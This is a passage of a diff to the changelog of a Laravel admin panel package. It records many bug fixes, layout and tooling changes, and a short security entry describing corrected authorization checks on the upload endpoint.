+  and discovery then never runs — which is the point of it, and the trap: a resource added
+  afterwards simply is not in the panel. No route, no navigation entry, no error, and no way to
+  guess that `panel:clear` is the answer. The manifest now records a fingerprint of the discovery
+  paths (file count and newest mtime), and boot compares it. **Only when a manifest exists and only
+  outside production**, so it costs nothing in the case it is not for. The file gained a `panels`
+  key alongside `fingerprint`; a manifest written by an older version still loads unchanged, so an
+  upgrade does not need a cache clear to boot.
+- **A resource missing from the sidebar for want of a policy says so, in development.**
+  `Gate::allows()` denies when no policy exists, which is correct and indistinguishable from a
+  policy that considered the question and said no. When navigation drops a resource *and* the model
+  has no policy at all, the panel now logs once per model, naming the `make:policy` command and
+  `Panel::strictAuthorization()` — which already turns this into an exception everywhere the panel
+  asks, and which nobody finds by staring at a gap in a sidebar.
+- **An icon that is not in the registry says so, in development.** `resolveIcon()` answered null
+  for an unknown name exactly as it does for no name, so a mistyped icon — or, far more often, one
+  declared in PHP after `php artisan panel:icons` was last run — drew nothing with no way to find
+  out why. It now warns once per name in development, naming the icon and the command that fixes
+  it. Production is unchanged: the icon is still simply absent, because this is a build problem
+  rather than a runtime one.
+- **A resource that forgets `$model` says so.** PHP answered `Typed static property
+  PandaPanel\Resources\Resource::$model must not be accessed before initialization`, which names
+  this framework's class rather than the resource that forgot, and does not say what to write. It
+  now names the resource and prints the line to add.
+- **Column spans no longer overflow their grid.** A span was clamped against the *declared* column
+  count, not the count at the breakpoint being rendered. A four-column form is two columns wide at
+  `md`, so `columnSpan(3)` and `columnSpan(4)` emitted `md:col-span-3` / `md:col-span-4` against two
+  tracks — `grid-column: span 4` creates the missing tracks implicitly, and the row overflowed
+  sideways. Spans are now clamped per breakpoint, and `columnSpanFull()` compiles to
+  `col-span-full` (`grid-column: 1 / -1`) rather than resolving to a number that is only right at
+  one width.
+- **`columns()` above four rendered one column.** Ten of the eleven `columns()` setters had no upper
+  bound, the renderer has literal classes for one to four, and anything else hit the one-column
+  fallback — the widest possible ask reported as the narrowest possible result, silently. Every
+  setter now clamps through `PandaPanel\Support\ColumnCount`.
+- **`FormSchema::columns()` had no effect.** The root count was serialized and then ignored: the
+  form renderer stacked its top-level nodes in a flex column, so a field asking for half a row got a
+  whole one. The root is now a grid like every other container. Layouts still take the full width,
+  so a form built out of sections is laid out exactly as before.
+- **The three grid class tables are one.** The form grid, the infolist node and the infolist
+  renderer each carried their own copy, and they had drifted — a four-column form dropped to two at
+  `md` while a four-column infolist stayed at four, so the same declaration laid out differently
+  depending on which drew it. All three now read `panel/lib/grid.ts`, whose tables
+  `FrontendContractTest` checks against the PHP clamp.
+- **Plugin version constraints are checked again.** `PluginCompatibility::PACKAGE` was left as
+  `panda-panel` when the composer package was renamed to `chocoalano/panel`, so
+  `InstalledVersions::getPrettyVersion()` threw on every call. The class reads that as "not
+  installed as a package" and answers null, and a null version skips the constraint — so every
+  `requiresPanel` a plugin declared had been passing unexamined, in every installation, since the
+  rename. The check itself was still there and would never have said no again.
+- **Panel pages declare their own layout.** All sixteen published pages relied on the application's
+  `app.ts` having a case for `panel/`, and nothing checked. Where it was missing every panel screen
+  rendered inside the starter kit's `AppLayout` — host sidebar, no panel navigation, registered
+  resources nowhere — at HTTP 200 with no error and no warning. They now carry
+  `defineOptions({ layout })`, so the wiring is not needed at all; auth pages carry
+  `PanelBlankLayout`, which adds nothing, because they already draw their own frame.
+  `panel:install` additionally reads `app.ts` and reports the one case the package cannot fix from
+  the inside — an unconditional `page.default.layout = AppLayout` — by file, line, and replacement.
+- **Broadcasting no longer assumes a broadcaster.** `Panel::$broadcasting` defaults to `true`, so
+  the server sent a channel to every signed-in user and the client called `echo()` on it. In an
+  application with no broadcaster that threw "Echo has not been configured" from inside
+  `onMounted`, which aborted the panel layout's mount and produced a cascade of
+  `Slot "default" invoked outside of the render function` warnings — none of which name a
+  broadcaster. `SharePanelData` now withholds the channel unless a broadcast connection is actually
+  configured (`BroadcastSupport::isConfigured()`), and `echo()` is wrapped so a frontend that never
+  called `configureEcho()` gets one development-only console warning instead of a broken screen.
+  **Behaviour change:** an application that broadcasts from PHP but has `BROADCAST_CONNECTION=null`
+  or `log` now gets no panel channel. That was already a connection no browser could subscribe to;
+  what changes is that the panel says so instead of failing at mount.
+- **The published TypeScript compiles in an application.** `usePanel` and `useNavigation` read
+  `usePage().props.<key>` and depended on a `declare module '@inertiajs/core'` augmentation
+  published into `resources/js/types/` — a directory the host already owns and already declares
+  things in. Where that did not take effect, `page.props` was `{}` and the *application's*
+  `vue-tsc` reported fourteen errors inside files nobody there wrote. The panel now reads its props
+  through `panel/types/shared.ts`, which needs no augmentation, and no longer ships a declaration
+  for `name`, `auth`, or `sidebarOpen` — those are the application's to declare.
+- **`FrontendRequirements` actually checks its host-module list.** A bare `''` in the extension list
+  meant `File::exists()` matched the *directory*, so `@/types` was satisfied by the folder this
+  package publishes into and could never fail — the same for `@/routes`. `.d.ts` and `/index.d.ts`
+  are now recognised (a starter kit writes `types/index.d.ts`), the bare match is gone, and
+  `@/types/ui` — imported by the panel's broadcasting and flash bridge, never shipped, never
+  listed — has been added. A new `FrontendContractTest` derives the list from the imports in the
+  published tree, so the next omission fails here rather than in somebody's build.
+
+## [0.1.0] - 2026-08-15
+
+### Security
+
+- Uploads are authorized by the form the field belongs to, and reading a resource is no longer
+  enough. `page=create` asks `create`, `page=edit` asks `update` on the named record, a relation
+  form asks the relation manager's own abilities per operation, and an action's form asks the
+  action. The endpoint previously accepted `canCreate() || canViewAny()`, so a read-only role
+  could write files to a disk.
+- The upload endpoint reads its context — resource, page, record, relation, action — from the
+  query string only. A form whose values happened to include a `resource` key could previously
+  point the upload at a different one.
+- `page` is an allowlist rather than "edit, or else create". An unrecognised value used to become
+  the create form, which is the one branch that needs no record.
+
+### Added
+
 - **Tenancy as public API.** `Panel::tenant()`, the `PanelTenant` and `HasPanelTenants` contracts,
   `PandaPanel\Tenancy\Tenancy`, the `ResolveTenant` middleware, and
   `Resource::$tenantRelationship` for automatic scoping. The framework identifies, authorizes,
@@ -713,6 +887,50 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   suite fails.
 - A Testbench harness, and `examples/` as the application it runs against — a user model, two
   panels, their policies, and the routes an application keeps once a panel arrives.
+
+### Changed
+
+- **The resource index is laid out as one object rather than five.** Tabs, the toolbar, the rows and
+  the pagination are joined into a single bordered surface divided by rules, instead of four blocks
+  floating in equal 24px gutters — which said they were four equally-related things and cost about
+  120px of nothing above the first row. The page heading is `text-xl` rather than `text-2xl`, and
+  the page rhythm is 16px. All of it buys rows on screen, which is what a dense screen is for.
+- **The selection bar and the form's save row are sticky.** Selecting a row used to insert a block
+  that pushed every row down, moving the checkbox out from under the pointer mid-selection; and on
+  a long form, Save was a scroll away from wherever you were. Both are now pinned to the bottom of
+  the viewport. This also required `overflow-x-clip` in place of `overflow-x-hidden` on the content
+  wrapper: `hidden` on one axis computes the other to `auto`, which makes that element a scroll
+  container and silently captures every `position: sticky` inside it. `StylingTest` guards it,
+  because that failure is invisible.
+- `DataTable` takes a `bordered` prop. True standalone — a relation table, a table widget — and
+  false on the resource index, where the surface around it is already the frame.
+- **PHP 8.2 is supported.** The floor was `^8.3` and nothing required it — no typed class
+  constants, no `#[\Override]`, no 8.3 standard library. PHP 8.2 resolves through Laravel
+  12, and CI runs that combination. Laravel 11 remains unsupported and cannot be
+  supported: every 11.x release is flagged by unpatched security advisories and composer
+  refuses to resolve against it.
+- The CI matrix runs ten test jobs (PHP 8.2/8.3/8.4 × Laravel 12/13 × lowest/stable,
+  less the combination Laravel 13 does not allow), and static analysis twice.
+  `composer require` for the framework and for testbench are separate calls, because one
+  call moved testbench out of `require-dev`.
+- `panel:install` is end-to-end: it registers the scaffolded panel in `config/panda-panel.php`
+  itself, checks the npm dependencies, the eighteen host modules, Vite and Inertia, and offers to
+  create a user, and records `.panel-assets.json` so the next upgrade can tell an edit
+  from a stale copy. It ends by naming what is left rather than by printing steps that
+  always appeared.
+- The guest redirect is registered by the service provider rather than being a manual
+  `bootstrap/app.php` step, using the same `afterResolving(Kernel::class)` ordering that made the
+  manual step necessary. `register_guest_redirect` turns it off for an application that sets its
+  own.
+- `PanelPlugin::publishes()` is on the contract rather than only on the `Plugin` base class, so
+  `panel:publish` asks any plugin — including one shipped as its own package, which should
+  implement the interface directly. `Plugin::in($panel)` reads a plugin's configuration back from
+  a panel.
+- `composer.json` declares what the package actually uses: `laravel/framework`,
+  `inertiajs/inertia-laravel`, `laravel/fortify`, `symfony/finder`, `ext-zip`, and
+  `src/Support/helpers.php` as an autoloaded file. `minimum-stability` is now `stable`.
+- `config/panda-panel.php` describes this package. It previously configured a skeleton whose
+  classes were never written.
 
 ### Fixed
 
@@ -778,56 +996,6 @@ adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   cannot find.
 - `docs/` and `.ai/rules/` name `PandaPanel\*` and `src/**` rather than the pre-extraction
   `App\Panel\*` and `app/Panel/**`.
-
-### Changed
-
-- **An empty dashboard explains itself.** The first screen after an install used to be a dashed box
-  reading "No widgets on this dashboard" — true, and useless, and drawn with an icon that was not
-  in the registry so it rendered nothing at all. `DashboardGuide` replaces it: the two generator
-  commands with this panel already filled in and a copy button on each, plus links to the
-  destinations the panel already has, so a new panel is not a dead end. All of it reads props the
-  shell already shares, so an empty dashboard still costs no query.
-- **The resource index is laid out as one object rather than five.** Tabs, the toolbar, the rows and
-  the pagination are joined into a single bordered surface divided by rules, instead of four blocks
-  floating in equal 24px gutters — which said they were four equally-related things and cost about
-  120px of nothing above the first row. The page heading is `text-xl` rather than `text-2xl`, and
-  the page rhythm is 16px. All of it buys rows on screen, which is what a dense screen is for.
-- **The selection bar and the form's save row are sticky.** Selecting a row used to insert a block
-  that pushed every row down, moving the checkbox out from under the pointer mid-selection; and on
-  a long form, Save was a scroll away from wherever you were. Both are now pinned to the bottom of
-  the viewport. This also required `overflow-x-clip` in place of `overflow-x-hidden` on the content
-  wrapper: `hidden` on one axis computes the other to `auto`, which makes that element a scroll
-  container and silently captures every `position: sticky` inside it. `StylingTest` guards it,
-  because that failure is invisible.
-- `DataTable` takes a `bordered` prop. True standalone — a relation table, a table widget — and
-  false on the resource index, where the surface around it is already the frame.
-- **PHP 8.2 is supported.** The floor was `^8.3` and nothing required it — no typed class
-  constants, no `#[\Override]`, no 8.3 standard library. PHP 8.2 resolves through Laravel
-  12, and CI runs that combination. Laravel 11 remains unsupported and cannot be
-  supported: every 11.x release is flagged by unpatched security advisories and composer
-  refuses to resolve against it.
-- The CI matrix runs ten test jobs (PHP 8.2/8.3/8.4 × Laravel 12/13 × lowest/stable,
-  less the combination Laravel 13 does not allow), and static analysis twice.
-  `composer require` for the framework and for testbench are separate calls, because one
-  call moved testbench out of `require-dev`.
-- `panel:install` is end-to-end: it registers the scaffolded panel in `config/panda-panel.php`
-  itself, checks the npm dependencies, the eighteen host modules, Vite and Inertia, and offers to
-  create a user, and records `.panel-assets.json` so the next upgrade can tell an edit
-  from a stale copy. It ends by naming what is left rather than by printing steps that
-  always appeared.
-- The guest redirect is registered by the service provider rather than being a manual
-  `bootstrap/app.php` step, using the same `afterResolving(Kernel::class)` ordering that made the
-  manual step necessary. `register_guest_redirect` turns it off for an application that sets its
-  own.
-- `PanelPlugin::publishes()` is on the contract rather than only on the `Plugin` base class, so
-  `panel:publish` asks any plugin — including one shipped as its own package, which should
-  implement the interface directly. `Plugin::in($panel)` reads a plugin's configuration back from
-  a panel.
-- `composer.json` declares what the package actually uses: `laravel/framework`,
-  `inertiajs/inertia-laravel`, `laravel/fortify`, `symfony/finder`, `ext-zip`, and
-  `src/Support/helpers.php` as an autoloaded file. `minimum-stability` is now `stable`.
-- `config/panda-panel.php` describes this package. It previously configured a skeleton whose
-  classes were never written.
 
 ### Removed
 
